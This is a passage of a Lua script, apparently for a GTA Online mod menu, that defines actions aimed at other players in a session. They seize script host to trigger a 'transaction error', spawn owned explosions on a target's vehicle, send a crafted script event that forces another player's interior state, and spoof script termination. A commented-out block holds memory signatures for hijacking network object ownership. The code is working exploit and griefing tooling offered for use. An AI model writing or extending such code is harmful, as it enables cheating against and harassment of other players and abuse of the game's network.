        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        menu.trigger_commands("beast" .. players.get_name(pid))
        repeat 
            util.yield()
        until not ENTITY.IS_ENTITY_VISIBLE(ped) and SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(util.joaat("am_hunt_the_beast")) > 0
        util.spoof_script("am_hunt_the_beast", SCRIPT.TERMINATE_THIS_THREAD)
    end)

    menu.action(Plyrveh_list, "Transaction Error", {}, "Pretty inconsistent but whatever", function()
        if SCRIPT._GET_NUMBER_OF_REFERENCES_OF_SCRIPT_WITH_NAME_HASH(util.joaat("am_destroy_veh")) == 0 then
            util.request_script_host("freemode")
            while players.get_script_host() ~= players.user() do util.yield_once() end
            local sscript = menu.ref_by_path("Online>Session>Session Scripts>Run Script>Removed Freemode Activities>Destroy Vehicle")
            menu.trigger_command(sscript)
            while SCRIPT._GET_NUMBER_OF_REFERENCES_OF_SCRIPT_WITH_NAME_HASH(util.joaat("am_destroy_veh")) == 0 do
                util.yield(1000)
            end
        end
        local blip = HUD.GET_FIRST_BLIP_INFO_ID(225) == 0 and 348 or 225
        local coords = get_blip_coords(blip)
        local explodeTargetVeh = function()
            ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), true)
            local handle = PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) and PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false) or players.user_ped()
            local oldPos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), false)
            ENTITY.SET_ENTITY_COORDS(handle, coords.x, coords.y + 20, coords.z, false, false, false, false)
            util.yield(1000)
            coords = get_blip_coords(blip)
            FIRE.ADD_OWNED_EXPLOSION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), coords.x, coords.y, coords.z, 4, 50, false, true, 0.0)
            handle = PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) and PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false) or players.user_ped()
            util.yield(1000)
            ENTITY.SET_ENTITY_COORDS(handle, oldPos.x, oldPos.y, oldPos.z, false, false, false, false)
            ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), false)
            FIRE.ADD_OWNED_EXPLOSION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), coords.x, coords.y, coords.z, 4, 50, false, true, 0.0)
        end
        if coords.x ~= 0 and coords.y ~= 0 and coords.z ~= 0 then
            explodeTargetVeh()
        else
            util.yield(2500)
            coords = get_blip_coords(blip)
            while coords.x == 0 do
                coords = get_blip_coords(blip)
                util.yield_once()
            end
            explodeTargetVeh()
        end
    end)

    menu.action(Plyrveh_list, "Force Interior State", {}, "Can Be Undone By Rejoining. Player Must Be In An Apartment", function(s)
        if is_player_in_interior(pid) then
            util.trigger_script_event(1 << pid, {-1338917610, pid, pid, pid, pid, math.random(-2147483647, 2147483647), pid})
        else
            util.toast("Player isn't in an apartment. :/")
        end
    end)
--[[
    local orgScan = memory.scan

    function memory.scan(name, pattern, callback)
        local address = orgScan(pattern)
        if address ~= NULL then
            util.log("Found " .. name)
            callback(address)
        else
            util.log("Failed to find " .. name)
            util.stop_script()
        end
    end
    
    function get_net_obj(entity)
        local pEntity = entities.handle_to_pointer(entity)
        return pEntity ~= NULL and memory.read_long(pEntity + 0x00D0) or NULL
    end
    
    function get_entity_owner(entity)
        local net_obj = get_net_obj(entity)
        return net_obj ~= NULL and memory.read_byte(net_obj + 0x49) or -1
    end
    
    function GetNetGamePlayer(player)
        return util.call_foreign_function(GetNetGamePlayer_addr, player)
    end
    
    memory.scan("GetNetGamePlayer", "48 83 EC ? 33 C0 38 05 ? ? ? ? 74 ? 83 F9", function (address)
        GetNetGamePlayer_addr = address
    end)
    memory.scan("CNetworkObjectMgr", "48 8B 0D ? ? ? ? 45 33 C0 E8 ? ? ? ? 33 FF 4C 8B F0", function (address)
        CNetworkObjectMgr = memory.rip(address + 3)
    end)
    
    memory.scan("ChangeNetObjOwner", "48 8B C4 48 89 58 08 48 89 68 10 48 89 70 18 48 89 78 20 41 54 41 56 41 57 48 81 EC ? ? ? ? 44 8A 62 4B", function (address)
        ChangeNetObjOwner_addr = address
    end)
]]
    
    menu.action(Plyrveh_list, "Disable Explosive Projectiles", {}, "Will Disable Explosive Projectiles For The Player.", function(toggle) 
        local baseball = util.joaat("weapon_ball")
        STREAMING.REQUEST_MODEL(baseball)
        local id = PLAYER.PLAYER_PED_ID()
        local coords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        for i = 1, 70 do
            WEAPON.GIVE_WEAPON_TO_PED(id, baseball, 1, false, false)
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(coords.x, coords.y, coords.z + 5, coords.x, coords.y, coords.z + 5, 0, true, util.joaat("WEAPON_BALL"), PLAYER.PLAYER_PED_ID(), false, true, 0, ped, 0)
        end
        util.yield(500)
        MISC.CLEAR_AREA_OF_PROJECTILES(coords.x, coords.y, coords.z, 400, 0)
    end)
end)

players.dispatch_on_join()
util.keep_running()